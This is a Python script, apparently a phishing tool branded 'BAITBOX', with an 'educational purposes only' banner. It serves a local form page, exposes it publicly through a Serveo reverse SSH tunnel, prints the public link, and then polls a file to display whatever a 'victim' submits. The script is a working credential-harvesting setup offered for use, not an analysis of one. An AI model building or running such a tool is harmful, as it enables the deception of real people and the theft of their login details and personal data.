import os
import time
import subprocess
import platform
import signal

# Clear the console screen based on the OS
def clear_console():
    if platform.system() == "Windows":
        os.system('cls')
    else:
        os.system('clear')

clear_console()

# Check if the script is running in CLI mode
if not os.isatty(0):
    print("\033[31mThis tool must be run from the command line.\n\033[0m")
    exit()

# Print ASCII art in red
print("\033[31m")
print("██████╗  █████╗ ██╗████████╗██████╗  ██████╗ ██╗  ██╗")
print("██╔══██╗██╔══██╗██║╚══██╔══╝██╔══██╗██╔═══██╗╚██╗██╔╝")
print("██████╔╝███████║██║   ██║   ██████╔╝██║   ██║ ╚███╔╝ ")
print("██╔══██╗██╔══██║██║   ██║   ██╔══██╗██║   ██║ ██╔██╗ ")
print("██████╔╝██║  ██║██║   ██║   ██████╔╝╚██████╔╝██╔╝ ██╗")
print("╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝   ╚═════╝  ╚═════╝ ╚═╝  ╚═╝")
print("                                                     ")
print("\033[0m")
print("\033[31mNote: For Educational Purposes Only\n\033[0m")

# Define the local server host and port
host = "localhost"
port = "8005"

# Capture the start time for server startup performance measurement
start_time = time.time()

# Start the built-in Python HTTP server in the background
server_process = subprocess.Popen(
    ["python3", "-m", "http.server", port],
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE
)

# Capture the end time after server startup
end_time = time.time()

# Calculate the time taken to start the server in milliseconds
time_taken = (end_time - start_time) * 1000

# Check if the server started successfully
if server_process:
    print(f"Starting server on http://{host}:{port}")
    print(f"\033[32mServer started successfully in {round(time_taken, 2)} milliseconds.\n\033[0m")
else:
    print("\033[31mError: Server could not be started.\n\033[0m")

# Define the path to the form file (index.html)
form_file = "index.html"

# Check if the form file exists
if not os.path.exists(form_file):
    print("Error: The form file index.html is missing. Please create the form.")
    exit()

# Setup response directory and files for SSH output and user input handling
response_dir = "response"
input_file = os.path.join(response_dir, "input.txt")
ssh_output_file = os.path.join(response_dir, "ssh_output.txt")

# Create the response directory if it doesn't exist
os.makedirs(response_dir, exist_ok=True)

# Create input.txt and ssh_output.txt if they don't exist
if not os.path.exists(input_file):
    with open(input_file, 'w') as f:
        pass

if not os.path.exists(ssh_output_file):
    with open(ssh_output_file, 'w') as f:
        pass
    print(f"Created {ssh_output_file} for SSH output.")

# Establish an SSH tunnel using Serveo
print("\033[32mEstablishing SSH tunnel...\033[0m")
ssh_command = f"ssh -R 80:localhost:{port} serveo.net > {ssh_output_file} 2>&1 &"
subprocess.Popen(ssh_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# Wait for the SSH tunnel to establish and fetch the tunnel URL
tunnel_url = None
while tunnel_url is None:
    if os.path.exists(ssh_output_file):
        with open(ssh_output_file, 'r') as f:
            lines = f.readlines()
            for line in lines:
                if "http" in line:
                    tunnel_url = line.strip()
                    print(f"\033[32mTunnel URL: {tunnel_url}\033[0m")
                    break
    time.sleep(1)

# Start monitoring input from input.txt
print("\033[33mWaiting for victim input...\n\033[0m")
print("\033[34mPress Ctrl+C to stop.\033[0m")

try:
    while True:
        if os.path.exists(input_file):
            with open(input_file, 'r') as f:
                input_data = f.read().strip()

            if input_data:
                print("-------------------------------------")
                print("Input received: ")
                print(f"\033[32m{input_data}\033[0m")
                print("-------------------------------------")

                # Clear the input file after reading
                with open(input_file, 'w') as f:
                    f.write("")

        time.sleep(2)  # Wait for 2 seconds before checking again
except KeyboardInterrupt:
    print("\nShutting down...")
    server_process.terminate()
    server_process.wait()
    print("Server stopped.")
    exit()
